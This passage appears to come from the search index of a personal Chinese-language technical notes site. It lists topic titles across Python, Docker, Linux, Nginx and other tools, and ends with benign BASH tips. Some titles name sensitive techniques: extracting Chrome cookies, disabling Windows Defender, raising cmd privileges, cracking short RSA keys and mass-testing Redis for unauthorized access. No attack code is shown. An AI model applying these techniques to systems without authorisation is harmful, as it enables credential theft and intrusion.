\u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362 \u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b \u6355\u6349\u7528\u6237\u7684Ctrl+C \u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668 \u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5 \u4f7f\u7528Python\u5f00\u53d1\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u540e\u7aef\u670d\u52a1 \u4fee\u590dgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d Crack RSA! \u7834\u89e3\u77ed\u957f\u5ea6\u5bc6\u94a5\u7684RSA\u52a0\u5bc6 \u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362 \u7528redis\u5b58\u50a8\u5b57\u5178 python selenium+Docker chrome headless\u722c\u590d\u6742\u7f51\u9875 python transmissionrpc \u4e0a\u4f20\u79cd\u5b50 \u83b7\u53d6\u72b6\u6001 \u589e\u52a0tracker \u4fee\u6539torrent\u6587\u4ef6\u4e2d\u7684tracker uwsgi\u4f18\u96c5\u91cd\u542f Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8 \u4f7f\u7528sentry \u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898 Python\u83b7\u53d6Windows Chrome\u7684Cookie Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8 Ubuntu16.04\u5b89\u88c5Python3.7 Python\u4f7f\u7528MongoDB \u589e\u5220\u67e5\u6539 \u6279\u91cf\u8986\u76d6\u63d2\u5165 \u591a\u8868join \u968f\u673a\u91c7\u6837","title":"Python"},{"location":"#python_1","text":"\u4f5c\u4e1a\u7684\u5e38\u89c1\u9519\u8bef\uff0c\u671f\u672b\u590d\u4e60","title":"Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b"},{"location":"#gist-python","text":"\u8fde\u63a5mysql\u63d2\u5165\u3001\u67e5\u8be2 \u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178 print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4 mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf \u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32 pyaes\u5e93","title":"gist Python\u4e00\u4e9b\u5e38\u7528\u7684\u4ee3\u7801\u7247\u6bb5"},{"location":"#bash","text":"\u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias \u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a for\u5faa\u73af \u5224\u65ad\u547d\u4ee4\u3001\u6587\u4ef6\u662f\u5426\u5b58\u5728 rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c","title":"BASH"},{"location":"#bat","text":"\u5feb\u901f\u6253\u5f00cmd \u5e76\u5217\u8bed\u53e5\u8bed\u6cd5 \u5faa\u73affor \u7ed3\u675f\u8fdb\u7a0btaskkill \u5185\u5b58\u6574\u7406free \u7761\u4e00\u4f1aSleepX \u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728 \u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create \u7aef\u53e3\u8f6c\u53d1 \u4fdd\u6301RVPN\u4e0d\u65ad\u5f00 vpn\u9759\u6001\u8def\u7531\u914d\u7f6e \u8fdb\u5165\u4f11\u7720 \u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e\uff0c\u4e0d\u7528\u6253\u5f00IE \u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650 \u547d\u4ee4\u884c\u914d\u7f6eIP \u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt \u547d\u4ee4\u884c\u4e34\u65f6\u5173\u95edWindows Defender \u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP","title":"BAT \u6279\u5904\u7406"},{"location":"#bitcoin","text":"\u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd \u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229 \u5b9e\u65f6\u6536\u76ca\u7387","title":"Bitcoin"},{"location":"#c","text":"\u5173\u4e8eDev C++ \u8f93\u5165\u7684\u95ee\u9898\uff0c\u5efa\u8bae\u7528gets\u548csscanf C++\u7528sstream\u4ee3\u66ffsprintf g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898 [\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386 \u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator \u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f \u9898\u76ee\u89e3\u6790 (\u7ed3\u6784\u6307\u9488\u3001\u7ed3\u6784\u6570\u7ec4\u2026)","title":"C \u8bed\u8a00"},{"location":"#cdn","text":"\u00b7UPYUN \u53c8\u62cd\u4e91 \u7ba1\u7406\u6587\u4ef6\u53ef\u4ee5\u7528FTP\uff0cUpyunManager\uff0cUpx python\u89c4\u5219\u5237\u65b0\uff0cpython\u8c03\u7528\u5b98\u65b9API\u8fdb\u884cURL\u5237\u65b0 \u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898 \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd https\u8bc1\u4e66\u66f4\u65b0\u7684\u81ea\u52a8\u5316\u811a\u672c \u8868\u5355\u4e0a\u4f20bash\u5feb\u901f\u8c03\u7528 \u00b7Qiniu \u4e03\u725b \u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939 \u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9 UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42","title":"CDN"},{"location":"#curl","text":"\u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42 \u57fa\u672c\u6559\u7a0b \u8fd8\u53ef\u4ee5\u5faa\u73af\u54df wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde","title":"cURL"},{"location":"#developer","text":"\u4fdd\u6301\u6280\u672f\u7cbe\u8fdb \u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee \u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247 \u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f \u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba Go\u8bed\u8a00-\u5b89\u88c5 \u5b89\u88c5\u7f3a\u5931\u5e93","title":"Developer"},{"location":"#docker","text":"myubuntu \u57fa\u7840\u955c\u50cf \u5b89\u88c5 \u52a0\u901f\u955c\u50cf\u4e0b\u8f7d \u65e7\u7248\u672c\u5378\u8f7d \u83b7\u5f97\u5bb9\u5668\u7684ip \u5bfc\u5165\u5bfc\u51fa\u5bb9\u5668 \u89e3\u51b3iptables failed\u95ee\u9898 \u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8 \u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig\u7684\u95ee\u9898 \u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c \u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts \u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e \u5feb\u901f\u90e8\u7f72ftp \u5feb\u901f\u90e8\u7f72wordpress Dockerfile \u4e2d\u7684 apt-get \u9759\u9ed8\u6267\u884c \u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u5feb\u901f\u90e8\u7f72samba [CTF]\u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1 \u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B \u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898 \u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898 \u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b \u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI \u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat \u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d Docker\u4f7f\u752832\u4f4d\u955c\u50cf \u4fee\u6539Docker\u5e95\u5c42\u6587\u4ef6\u4fee\u6539macvlan\u53d8\u66f4\u7f51\u6bb5 \u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694 nsenter\u8fdb\u5165\u5bb9\u5668\u68c0\u67e5\u7f51\u7edc \u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4 \u56fa\u5b9a\u5bb9\u5668\u7684IP Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1 \u79c1\u6709registry\u7684api","title":"Docker"},{"location":"#eth","text":"\u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH \u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740 Python\u53d1\u8d77\u4ea4\u6613(Web3.py) \u5730\u5740\u4ea4\u6613\u67e5\u8be2API","title":"ETH"},{"location":"#favorites","text":"Intel i386 \u624b\u518c \u53ca \u52d8\u8bef ASCII\u5b57\u7b26\u56fe\u6848\u751f\u6210 \u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570 \u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d \u5efa\u8bae\u8bfb\u7684\u8bba\u6587 More Links Git Emoji","title":"Favorites"},{"location":"#flask","text":"\u5e94\u7528\u6839\u76ee\u5f55APP_ROOT render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf \u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55 \u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206 \u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6 lazyload \u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c \u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1 \u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf","title":"Flask"},{"location":"#fuzzing","text":"","title":"Fuzzing"},{"location":"#dataflow-sanitizer","text":"Compiling Exiv2 with DFSan (including compile libcxx)","title":"DataFlow Sanitizer"},{"location":"#git","text":"\u7acb\u5373\u4f7f\u7528 git clone\u52a0\u901f \u2013depth 1 git push\u52a0\u901f git push\u514d\u5bc6\u7801 bash\u5de5\u4f5c\u73af\u5883(\u522b\u540d,\u81ea\u52a8\u5b8c\u6210,dirty\u63d0\u793a)\u8bbe\u7f6e \u597d\u73a9\u7684\u547d\u4ee4\u4eec gitignore\u8d1f\u5411\u9009\u62e9 \u8865\u4e0acommit\u6f0f\u6389\u7684\u6587\u4ef6 \u2013amend \u5bc6\u7801\u6cc4\u9732\u67e5\u4f5c\u8005 blame \u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21\u63d0\u4ea4 add -p \u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539 \u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u \u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d \u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4 GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key \u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93","title":"Git"},{"location":"#github-project-recommendation","text":"\u89c6\u9891\u4e0b\u8f7dyou-get \u8bb0\u5fc6\u624b\u6bb5Anki \u5728\u7ebf\u8bc4\u6d4bOnlineJudge Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0bsympy \u8ba9\u7f51\u7ad9\u94fe\u63a5\u79d2\u5f00InstantClick","title":"Github Project Recommendation"},{"location":"#java","text":"\u4e00\u4e9bJava\u4e0eC++\u7684\u4e0d\u540c\u4e4b\u5904 \u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898 JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570 \u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e","title":"Java"},{"location":"#javascript","text":"\u4f7f\u7528\u672c\u5730\u5b58\u50a8localStorage \u968f\u673a\u5b57\u7b26\u4e32\u751f\u6210 \u5f02\u5e38 \u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875 jQuery\u7ed1\u5b9a\u201d\u53d8\u4e3a\u53ef\u89c1\u201d\u4e8b\u4ef6 \u8bfb\u53d6GET\u53c2\u6570 \u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55 \u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001 \u4f7f\u7528InstantClick\u8e29\u5751 \u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9 \u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027 \u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8 Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5 \u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6","title":"JavaScript"},{"location":"#jekyll","text":"\u78b0\u5230\u8fc7\u7684\u5751 \u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7 \u89e3\u51b3Github Metadata Warning \u5b89\u88c5Jekyll","title":"Jekyll"},{"location":"#linux-setup","text":"\u7f51\u7edc\u52a0\u901fprivoxy \u914d\u7f6e\u6709\u7ebf\u9759\u6001IP \u4f7f\u7528ifconfig\u4fee\u6539ip\u540e\u8bb0\u5f97\u8981\u91cd\u65b0\u914droute \u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6 \u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP \u9510\u901f\u5b89\u88c5 \u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898 UnixBench\u6027\u80fd\u8bc4\u6d4b \u6e05\u9664\u5185\u5b58\u7f13\u5b58 \u4f7f\u7528iptables\u5c01ip iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3 \u65e0root\u6743\u9650\u4f7f\u7528screen screen\u7684\u7528\u6cd5 \u4e24\u6761iptables\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3 \u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220chattr +i \u65f6\u533a\u8bbe\u7f6e \u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570 \u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237 \u7b80\u5355OpenVPN\u914d\u7f6e \u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e \u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4 \u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a \u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8 /dev/loop0\u6269\u5bb9 \u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8 \u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a \u542f\u7528rc.local","title":"Linux-setup"},{"location":"#linux-ssh","text":"\u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa \u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd ssh\u53cd\u5411\u4ee3\u7406 \u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1 ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu","title":"Linux-SSH"},{"location":"#linux-cli","text":"\u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9 grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863 \u5e2e\u52a9\u6587\u672c\u7684grep \u75282>&1 \u5404\u79cd\u89e3\u538b\u547d\u4ee4 \u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22 \u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570 \u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f wget\u6162\u6162\u4e0b\u8f7d touch\u4fee\u6539\u65f6\u95f4\u6233 \u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272 \u6362\u884c\u65b9\u5f0f\u4fee\u6539 iodine\u2013\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e \u8fdc\u7a0b\u63a7\u5236Windows \u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801 \u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f \u5b89\u88c5ffmpeg \u4fee\u6539readonly\u7684\u53d8\u91cf \u6c38\u4e45\u7b49\u5f85 sleep infinity zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3 \u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e \u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a \u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664 \u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26 :set ff=unix watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa \u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1 scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20 \u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09 \u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b \u6279\u91cf\u66ff\u6362\u6587\u672c \u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5 redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c \u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9 coredump in fuzzing bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386 grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9 \u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9 gdb\u81ea\u52a8\u5316 mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6","title":"Linux-cli"},{"location":"#linux-backup","text":"\u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981 \u7528rsync\u4ee3\u66ffscp \u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd rsync\u5907\u4efd\u5b89\u5353\u624b\u673a","title":"Linux-backup"},{"location":"#mysql","text":"\u67e5\u770b\u8868\u7ed3\u6784 desc MERGE\u5b58\u50a8\u5f15\u64ce \u5220\u9664\u8868\u7684\u5197\u4f59 \u4fee\u6539\u8868 alter table \u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3\u7684\u51fd\u6570 \u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0 \u67e5\u8be2\u4f18\u5316\u2013explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort\uff1b\u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9 \u5185\u5b58\u8868The table is full\u7684\u89e3\u51b3 replace\u51fd\u6570\u66ff\u6362\u6587\u672c \u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57 mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18 \u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4 \u89e3\u51b3 Too many open files \u9519\u8bef \u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898 NULL\u8f6c0 \u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236","title":"MySQL"},{"location":"#nginx","text":"Nginx\u601d\u8003\u9898 \u666e\u901a\u8d44\u6e90\u5141\u8bb8POST \u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c \u83b7\u5f97Let\u2019s encrypt\u514d\u8d39https\u8bc1\u4e66 \u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66 \u914d\u7f6e\u5b89\u5168\u7684https \u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c root\u4e0ealias\u7684\u533a\u522b \u5728bash on win10\u4e0a\u4f7f\u7528Nginx Nginx\u5141\u8bb8\u5217\u76ee\u5f55 \u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668: \u591a\u4e0a\u6e38\u5207\u6362\uff0cSeaweedFS Docker\u90e8\u7f72 proxy_pass \u52a8\u6001\u4ee3\u7406 \u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66 \u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7","title":"Nginx"},{"location":"#php","text":"\u663e\u793a\u9519\u8bef\u4fe1\u606f \u5168\u9875\u9762iframe","title":"PHP"},{"location":"#rabbitmq","text":"\u4f7f\u7528Docker\u90e8\u7f72 \u4efb\u52a1\u63a8\u9001\u6267\u884c \u4ee3\u7801\u793a\u4f8b","title":"RabbitMQ"},{"location":"#ubuntu","text":"\u5b89\u88c5Google\u62fc\u97f3\u540e\u7528\u4e0a\u4e91\u5019\u9009\u529f\u80fd","title":"Ubuntu\u684c\u9762\u7248"},{"location":"#virtualbox","text":"\u4e0b\u8f7d\u5b89\u88c5\uff0c\u4e00\u5b9a\u8bb0\u5f97\u5b89\u88c5\u989d\u5916\u5305 \u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879 \u542f\u52a8\u865a\u62df\u673a \u8fdc\u7a0b\u63a7\u5236\u865a\u62df\u673a","title":"VirtualBox"},{"location":"#winsoftware","text":"Emeditor Everything Sysinternals Utilities CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668 U\u76d8\u5b89\u88c5\u539f\u7248\u7cfb\u7edf\u76d8 WinRAR BurpSuite BEncode Editor Win10 Windows\u7167\u7247\u67e5\u770b\u5668","title":"WinSoftware"},{"location":"BASH/","text":"BASH \u00b6 \u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias \u00b6 @TAG alias \u52a0\u4e0a\u8fd9\u4e48\u4e00\u53e5\uff1a shopt -s expand_aliases \u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a \u00b6 \u5728python\u91cc\u53ef\u4ee5\u7528len(sys.argv)\u5224\u65ad\u53c2\u6570\u4e2a\u6570\uff0cbash\u91cc\u7528\u4e2d\u62ec\u53f7\u91cc\u7684-z if [ -z \"$1\" ] && [ -z \"$2\" ]; then echo \"Usage: $0 <parameter1> <parameter2>\" fi for\u5faa\u73af\u7528seq\u751f\u6210\u6570\u5b57\u5217\u8868 \u00b6 @TAG seq \u6ce8\u610f\u7ec8\u70b9\u662f\u5305\u542b\u5728\u5185\u7684\uff0c\u4e0d\u540c\u4e8ePython\u7684range seq 3 : 1 2 3 seq 2 3 : 2 3 seq 1 2 5 : 1 3 5 for i in $(seq 1 $END); do echo $i; done BASH\u505a\u4e0d\u540c\u8fdb\u5236\u95f4\u6570\u5b66\u8ba1\u7b97 \u00b6 \u4e0d\u9700\u8981bc\u4e5f\u53ef\u4ee5\u76f4\u63a5\u505a\u8ba1\u7b97\uff0c\u4f8b\u5982\u8ba1\u7b975+0xa+0b1010 echo $((5+16#a+2#1010)) \u5224\u65ad\u547d\u4ee4\u4e0d\u5b58\u5728\u518dapt\u5b89\u88c5 \u00b6 command -v aria2c >/dev/null 2>&1 || { apt update && apt install -y aria2; } \u5982\u679c\u6709\u591a\u4e2a\u8f6f\u4ef6\u53ef\u80fd\u8981\u5b89\u88c5\uff0c\u6ca1\u5fc5\u8981\u6bcf\u6b21\u90fdapt update\uff0c\u53ef\u4ee5\u5148\u88c5\u4e86\u518d\u8bf4 \u5931\u8d25\u5c31apt update command -v 7z >/dev/null 2>&1 || { apt-get install -y p7zip; } command -v 7z >/dev/null 2>&1 || { apt update; apt-get install -y p7zip; } \u5224\u65ad\u6587\u4ef6\u4e0d\u5b58\u5728 \u00b6 \u6ce8\u610f ] \u524d\u9762\u8981\u6709\u7a7a\u683c if [ ! -f \"somefile\" ]; then curl ... fi sort\u6392\u5e8f \u00b6 \u9006\u5e8f -r \u6309\u7248\u672c\u6392\u5e8f \u6392\u5e8fIP\u5730\u5740 -V \u6309\u6570\u5b57\u6392\u5e8f -n 